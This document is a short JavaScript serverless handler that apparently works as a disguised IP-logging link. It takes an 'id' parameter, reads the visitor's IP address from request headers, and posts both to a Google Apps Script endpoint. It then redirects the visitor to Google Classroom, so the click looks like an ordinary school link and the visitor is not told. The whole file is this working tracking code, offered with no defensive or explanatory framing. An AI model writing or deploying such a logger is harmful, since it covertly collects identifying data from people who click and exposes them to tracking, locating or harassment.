export default async function handler(req, res) {
    const { id } = req.query;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    try {
        await fetch("https://script.google.com/macros/s/AKfycbxIPtQvEwkuAwLrH8htOxw2VNIi3rzPchi7y2Q2IBBy7vBZi73XcAZ4FxguRP00Wx_e/exec", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ id: id, ip: ip})
        });
    } catch (error) {
        return res.status(500).json({ error: "Failed to post data" });
    }
    
    res.writeHead(302, { Location: "https://classroom.google.com/h" });
    res.end();
}
